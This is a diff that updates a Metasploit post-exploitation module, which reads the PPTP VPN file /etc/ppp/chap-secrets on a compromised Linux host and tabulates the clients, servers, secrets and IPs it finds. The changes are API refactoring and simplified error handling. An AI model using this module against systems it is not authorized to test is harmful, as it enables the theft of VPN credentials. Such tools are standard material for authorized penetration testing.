@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
@@ -26,7 +23,7 @@ class Metasploit3 < Msf::Post
     register_options(
       [
         OptString.new('FILE', [true, 'The default path for chap-secrets', '/etc/ppp/chap-secrets'])
-      ], self.class)
+      ])
   end
 
 
@@ -35,20 +32,12 @@ class Metasploit3 < Msf::Post
   #
   def load_file(fname)
     begin
-      data = cmd_exec("cat #{fname}")
-    rescue RequestError => e
+      data = read_file(fname)
+    rescue Rex::Post::Meterpreter::RequestError => e
       print_error("Failed to retrieve file. #{e.message}")
       data = ''
     end
-
-    if data =~ /^#{fname}: regular file, no read permission$/ or data =~ /Permission denied$/
-      return :access_denied
-    elsif data =~ /\(No such file or directory\)$/
-      return :not_found
-    elsif data.empty?
-      return :empty
-    end
-
+    fail_with(Failure::BadConfig, "The file #{fname} does not exist or is not a readable file!") unless data
     return data
   end
 
@@ -85,7 +74,7 @@ class Metasploit3 < Msf::Post
   # Extracts client, server, secret, and IP addresses
   #
   def extract_secrets(data)
-    tbl = Rex::Ui::Text::Table.new({
+    tbl = Rex::Text::Table.new({
       'Header'  => 'PPTPd chap-secrets',
       'Indent'  => 1,
       'Columns' => ['Client', 'Server', 'Secret', 'IP']
@@ -136,18 +125,8 @@ class Metasploit3 < Msf::Post
 
   def run
     fname = datastore['FILE']
-    f     = load_file(fname)
-
-    case f
-    when :access_denied
-      print_error("No permission to read: #{fname}")
-    when :not_found
-      print_error("Not found: #{fname}")
-    when :empty
-      print_status("File is actually empty: #{fname}")
-    else
-      extract_secrets(f)
-    end
+    f = load_file(fname)
+    extract_secrets(f)
   end
 
 end
